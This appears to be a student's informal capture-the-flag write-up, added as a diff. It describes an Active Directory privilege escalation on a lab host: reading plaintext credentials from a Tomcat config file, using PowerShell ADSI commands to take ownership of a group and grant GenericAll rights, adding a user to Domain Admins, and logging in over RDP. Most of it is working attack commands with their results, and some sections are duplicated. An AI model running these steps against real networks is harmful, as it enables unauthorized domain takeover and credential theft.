@@ -1,0 +1,154 @@
+This one, I have to learn a lot about as most of it is done in powershell and im not as comfortable with 
+powershell as I'm with command prompt. so the task with this flag is getting access to the dekstop as 
+administrator and then proceed with finding the flag under the users using reverse desktop protocol. 
+
+Unfortunately, bloodhound wasnt working as expected, so I need to learn what it does and also sharphound 
+and what it does. so need to know more about that.
+
+
+But since knowing the file locations, its not needed to do that, so the file tomcat-users.xml has a list
+of users and their password, using that I sign in thru rdp using those credentials
+
+Same host as the tomcat thing, so 10.0.3.197, so use metasploit to do so and then type shell to go to the 
+command prompt and type powershell to do the following
+
+using Powershell, I granted myself persmissions or this user permissions and then logged out and then once I
+logged back in, it will work back again. 
+
+Here are the list of commands used to do so and the guide to do so and what it means
+
+
+Phase 1: Reconnaissance & Enumeration
+Step 1: AD Module Import
+powershell
+Import-Module ActiveDirectory
+Loaded AD PowerShell module for domain enumeration
+
+Step 2: HelpDesk Group Discovery
+powershell
+Get-ADGroup "HelpDesk"
+Found: HelpDesk group exists with full AD details
+
+DistinguishedName: CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local
+
+SID: S-1-5-21-264868819-4171338294-4143210697-1114
+
+Phase 2: Privilege Escalation - HelpDesk Takeover
+Step 3: ADSI Object Creation
+powershell
+$group = [ADSI]"LDAP://CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local"
+Created ADSI interface to manipulate HelpDesk group
+
+Step 4: Take Ownership
+powershell
+$user = New-Object System.Security.Principal.NTAccount("internal\tomcat.svc")
+$group.psbase.ObjectSecurity.SetOwner($user)
+$group.psbase.CommitChanges()
+Result: tomcat.svc became owner of HelpDesk group
+
+Step 5: Grant GenericAll Rights
+powershell
+
+Phase 1: Reconnaissance & Enumeration
+Step 1: AD Module Import
+powershell
+
+Command 1: Import-Module ActiveDirectory
+
+Loaded AD PowerShell module for domain enumeration
+
+Step 2: HelpDesk Group Discovery
+powershell
+
+Command 2: Get-ADGroup "HelpDesk"
+
+Found: HelpDesk group exists with full AD details
+
+DistinguishedName: CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local
+
+SID: S-1-5-21-264868819-4171338294-4143210697-1114
+
+Phase 2: Privilege Escalation - HelpDesk Takeover
+Step 3: ADSI Object Creation
+powershell
+
+COMMANDS:
+
+Command 3: $group = [ADSI]"LDAP://CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local"
+
+Created ADSI interface to manipulate HelpDesk group
+
+Step 4: Take Ownership
+powershell
+
+COMMANDS:
+
+Command 4: $user = New-Object System.Security.Principal.NTAccount("internal\tomcat.svc")
+Command 5: $group.psbase.ObjectSecurity.SetOwner($user)
+Command 6: $group.psbase.CommitChanges()
+
+Result: tomcat.svc became owner of HelpDesk group
+
+Step 5: Grant GenericAll Rights
+powershell
+
+COMMANDS:
+
+Command 7: $acl = $group.psbase.ObjectSecurity
+Command 8: $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user,"GenericAll", "Allow")
+Command 9: $acl.AddAccessRule($rule)
+Command 10: $group.psbase.CommitChanges()
+
+Result: tomcat.svc granted full control over HelpDesk group
+
+Phase 3: User Discovery & Group Manipulation
+Step 6: Find Valid Users
+in command Prompt
+
+type "C:\ProgramData\Tomcat9\conf\tomcat-users.xml"
+
+Discovered Credentials:
+
+root / 1234
+
+crash_override / nebbie
+
+Step 7: Add User to HelpDesk
+powershell
+
+COMMANDS:
+
+Command 11: $helpdesk = [ADSI]"LDAP://CN=HelpDesk,CN=Users,DC=internal,DC=initech,DC=local"
+Command 12: $helpdesk.Add("LDAP://CN=crash_override,CN=Users,DC=internal,DC=initech,DC=local")
+Command 13: $helpdesk.SetInfo()
+Result: crash_override added to HelpDesk group
+
+Command 14: $acl = $group.psbase.ObjectSecurity
+Command 15: $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($user,"GenericAll", "Allow")
+Command 16: $acl.AddAccessRule($rule)
+Command 17: $group.psbase.CommitChanges()
+
+Result: tomcat.svc granted full control over HelpDesk group
+
+
+Step 8: RDP Login
+
+Command 18: xfreerdp3 /u:crash_override /p:nebbie /v:10.0.3.197 /cert:ignore
+
+Step 9: Domain Admin Privilege Escalation
+
+powershell
+
+Command 19: $daGroup = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=internal,DC=initech,DC=local"
+Command 20: $daGroup.Add("LDAP://CN=crash_override,CN=Users,DC=internal,DC=initech,DC=local")
+Command 21: $daGroup.SetInfo()
+
+Result: crash_override added to Domain Admins group
+
+Step 10: Let changes kick in
+
+logout of RDP and then login again with the same rdp command and do a search or go to the domain admin folder
+under users to find the flag
+
+I hosted this device using HTTP commands using webserver and then transferred the flag to my device but didnt
+work much
